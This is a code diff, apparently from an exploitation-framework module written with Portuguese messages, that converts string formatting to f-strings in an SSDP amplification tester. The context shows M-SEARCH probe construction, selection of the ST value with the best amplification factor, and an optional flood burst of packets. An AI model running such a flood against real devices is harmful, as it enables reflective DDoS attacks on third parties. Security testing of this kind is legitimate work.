@@ -70,12 +70,12 @@ class Exploit(Exploit):
         search_target = st or str(self.st_value)
         return (
             "M-SEARCH * HTTP/1.1\r\n"
-            "HOST: {}:{}\r\n"
+            f"HOST: {self.target}:{self.port}\r\n"
             "MAN: \"ssdp:discover\"\r\n"
-            "MX: {}\r\n"
-            "ST: {}\r\n"
+            f"MX: {int(self.mx_value)}\r\n"
+            f"ST: {search_target}\r\n"
             "\r\n"
-        ).format(self.target, self.port, int(self.mx_value), search_target).encode()
+        ).encode()
 
     def _send_msearch(self, st=None, collect_time=None):
         pkt = self._build_msearch(st)
@@ -127,10 +127,10 @@ class Exploit(Exploit):
 
     @multi
     def run(self):
-        print_status("SSDP Amplification Analysis → {}:{}".format(self.target, self.port))
+        print_status(f"SSDP Amplification Analysis → {self.target}:{self.port}")
 
         if not self.check():
-            print_error("Nenhuma resposta SSDP de {}:{}".format(self.target, self.port))
+            print_error(f"Nenhuma resposta SSDP de {self.target}:{self.port}")
             return
 
         print_success("Dispositivo SSDP confirmado")
@@ -144,14 +144,14 @@ class Exploit(Exploit):
             time.sleep(0.5)
 
         headers = ["ST Value", "Req (B)", "Resp (B)", "# Resp", "Amplificação"]
-        rows = [(st, str(rq), str(rs), str(rc), "{:.1f}x".format(a))
+        rows = [(st, str(rq), str(rs), str(rc), f"{a:.1f}x")
                 for st, rq, rs, rc, a in st_results]
         print_table(headers, *rows)
 
         best = max(st_results, key=lambda x: x[4])
-        print_info("Melhor amplificação: {:.1f}x com ST='{}'".format(best[4], best[0]))
+        print_info(f"Melhor amplificação: {best[4]:.1f}x com ST='{best[0]}'")
 
-        print_status("Medição detalhada ({} probes)...".format(self.probe_count))
+        print_status(f"Medição detalhada ({self.probe_count} probes)...")
         probe_results = []
         for _ in range(int(self.probe_count)):
             req_sz, resp_sz, resp_cnt = self._send_msearch(collect_time=int(self.mx_value) + 1)
@@ -163,21 +163,19 @@ class Exploit(Exploit):
             avg_amp = sum(p[3] for p in probe_results) / len(probe_results)
             avg_resp = sum(p[1] for p in probe_results) / len(probe_results)
             max_amp = max(p[3] for p in probe_results)
-            print_info("Tamanho médio de resposta: {:.0f} bytes".format(avg_resp))
-            print_info("Amplificação média: {:.1f}x | Pico: {:.1f}x".format(avg_amp, max_amp))
+            print_info(f"Tamanho médio de resposta: {avg_resp:.0f} bytes")
+            print_info(f"Amplificação média: {avg_amp:.1f}x | Pico: {max_amp:.1f}x")
             if avg_amp >= 20:
                 print_warning("CRÍTICO: fator >= 20x — alto risco de uso em DDoS reflexivo")
             elif avg_amp >= 5:
                 print_warning("ALTO: fator >= 5x")
 
         if not self.measure_only:
-            print_status("Enviando {} pacotes flood M-SEARCH...".format(self.flood_count))
+            print_status(f"Enviando {self.flood_count} pacotes flood M-SEARCH...")
             sent, total_bytes = self._flood_burst(int(self.flood_count), float(self.flood_delay))
             avg_a = sum(p[3] for p in probe_results) / len(probe_results) if probe_results else 1
             est_reflected = total_bytes * avg_a
-            print_info("Flood: {} pacotes, {} bytes enviados, ~{:.0f} bytes refletidos estimados".format(
-                sent, total_bytes, est_reflected,
-            ))
+            print_info(f"Flood: {sent} pacotes, {total_bytes} bytes enviados, ~{est_reflected:.0f} bytes refletidos estimados")
         else:
             print_info("Modo measure-only — defina measure_only=false para flood test")
 
